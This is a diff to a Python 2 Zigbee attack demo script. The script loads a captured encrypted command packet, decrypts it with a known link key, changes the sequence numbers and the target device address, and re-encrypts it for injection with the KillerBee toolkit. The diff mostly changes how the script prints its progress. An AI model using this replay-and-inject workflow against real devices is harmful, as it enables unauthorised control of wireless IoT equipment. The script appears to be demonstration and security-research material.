@@ -1,3 +1,5 @@
+#from HackingDemo.PrintHelper import reaviling_string
+
 __author__ = 'Soteria'
 
 # 1. Sniff link-status and route request messages
@@ -12,6 +14,7 @@ __author__ = 'Soteria'
 # 7. Inject!
 
 import dill  # In order to save and load packet from file
+import PrintHelper
 import logging
 log_killerbee = logging.getLogger('scapy.killerbee')
 import struct
@@ -54,19 +57,21 @@ encrypted_command_packet = dill.load(open(command_packet_file))
 # Save packet
 #dill.dump(lastPacket, open(command_packet_file, "w"))
 
-InjectionHelper.print_string_as_packet("Loaded packet", encrypted_command_packet.do_build().encode('hex'))
+PrintHelper.print_string_as_packet("Loaded packet", encrypted_command_packet.do_build().encode('hex'))
 
-print "Decrypting message..."
+
 # Extracting the MIC from the packet payload:
 encrypted_command_packet.mic = encrypted_command_packet.payload.payload.payload.fields['data'][-6:-2]
 # Storing the MIC to fix 3's bug later in the dev_sewio.py:
 InjectionHelper.MY_HEX_MIC = str(encrypted_command_packet.mic)
 # Omitting the data by 6 (to get rid of the FCS + MIC):
 encrypted_command_packet.payload.payload.payload.fields['data'] = encrypted_command_packet.payload.payload.payload.fields['data'][:-6]
-# Decrypting:
-decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 3)
+print "Payload is encrypted!"
+print "Decrypting message..."
+print "Encrypted: " + encrypted_command_packet.payload.payload.payload.fields['data'].encode('hex')
+decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 0)
+PrintHelper.reaviling_string("Decrypted: ", decrypted_command_packet_payload.do_build().encode('hex'))
 print ""
-
 
 # Advance injected packet sequence numbers
 next_ieee_seq_num = ieee_seq_num + 1
@@ -85,12 +90,15 @@ encrypted_command_packet.getlayer(ZigbeeSecurityHeader).fields['fc'] = next_zigb
 encrypted_command_packet.payload.fields['dest_addr'] = int(TARGET_DEVICE_ID,16)
 encrypted_command_packet.payload.payload.fields['destination'] = int(TARGET_DEVICE_ID,16)
 
-print "Encrypting message..."
-encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 3)
+sys.stdout.write("Encrypting message...")
+encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 0)
+sys.stdout.write("\rEncrypting message... DONE!")
 print ""
 
 print "Injecting packet..."
-InjectionHelper.print_string_as_packet("Packet data", encrypted_command_packet_to_inject.do_build().encode('hex'))
+PrintHelper.print_string_as_packet("Packet data", encrypted_command_packet_to_inject.do_build().encode('hex'))
 
 print ""
 #kbsendp(encrypted_command_packet_to_inject, channel = DEFAULT_KB_CHANNEL, inter = 0, loop = 0, iface = DEFAULT_KB_DEVICE, count = 1, verbose = 3)
+
+
